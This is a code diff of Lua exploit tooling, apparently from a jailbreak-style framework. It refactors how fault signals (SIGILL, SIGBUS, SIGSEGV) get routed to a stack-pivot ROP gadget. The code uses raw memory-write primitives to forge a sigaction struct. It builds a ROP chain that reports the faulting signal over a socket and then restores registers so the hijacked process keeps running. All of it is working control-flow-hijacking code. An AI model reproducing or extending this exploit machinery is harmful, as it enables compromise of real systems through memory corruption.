@@ -1,20 +1,10 @@
 
-signal = {}
+function register_signal_handler(handler_addr)
 
-function signal.init()
-
-    local pivot_handler = gadgets.stack_pivot[1]
-
-    local SIGILL = 4
-    local SIGBUS = 10
-    local SIGSEGV = 11
-    
     local signals = {SIGILL, SIGBUS, SIGSEGV}
-    
-    local SA_SIGINFO = 0x4
     local sigaction_struct = memory.alloc(0x28)
     
-    memory.write_qword(sigaction_struct, pivot_handler.gadget_addr) -- sigaction.sa_handler
+    memory.write_qword(sigaction_struct, handler_addr) -- sigaction.sa_handler
     memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags
 
     for i,signal in ipairs(signals) do
@@ -23,7 +13,21 @@ function signal.init()
         end
     end
 
+end
+
+
+signal = {}
+
+function signal.register()
+    local pivot_handler = gadgets.stack_pivot[1]
+    register_signal_handler(pivot_handler.gadget_addr)
     signal.setup_pivot_handler(pivot_handler)
+end
+
+function signal.clear()
+    local SIG_DFL = 0 -- default signal handling
+    local SIG_IGN = 1 -- signal is ignored
+    register_signal_handler(SIG_DFL)
 end
 
 function signal.setup_pivot_handler(pivot_handler)
@@ -32,20 +36,22 @@ function signal.setup_pivot_handler(pivot_handler)
     local reg_rbp_offset = 0x48
     local reg_rsp_offset = 0xb8    
     
+    if signal.pivot_already_setup then
+        return
+    end
+
     local ucontext_struct_addr = memory.alloc(8)
     local output_addr = memory.alloc(0x18)
     
     signal.fd_addr = memory.alloc(8)
 
-    syscall_mmap(pivot_handler.pivot_base, 0x2000)
-
+    map_fixed_address(pivot_handler.pivot_base, 0x2000)
+    
     local chain = ropchain({
         stack_base = pivot_handler.pivot_addr,
     })
 
-    --
     -- write error address back to socket
-    --
 
     memory.write_qword(output_addr, 0x13371337) -- write magic value    
     chain:push_store_rdi_into_memory(output_addr + 0x8) -- rdi contains signal code
@@ -68,9 +74,7 @@ function signal.setup_pivot_handler(pivot_handler)
         chain:push_set_reg_from_memory("rdi", signal.fd_addr)
     end)
 
-    --
-    -- gracefully restore execution
-    --
+    -- restore execution
 
     -- advance to old rbp
     chain:push_set_rax_from_memory(ucontext_struct_addr)
@@ -96,6 +100,8 @@ function signal.setup_pivot_handler(pivot_handler)
     chain:push_set_rdi(0)
     chain:push_set_rax(0)
     chain:push_set_rsp(0) -- will be changed
+
+    signal.pivot_already_setup = true
 end
 
 function signal.set_sink_fd(fd)
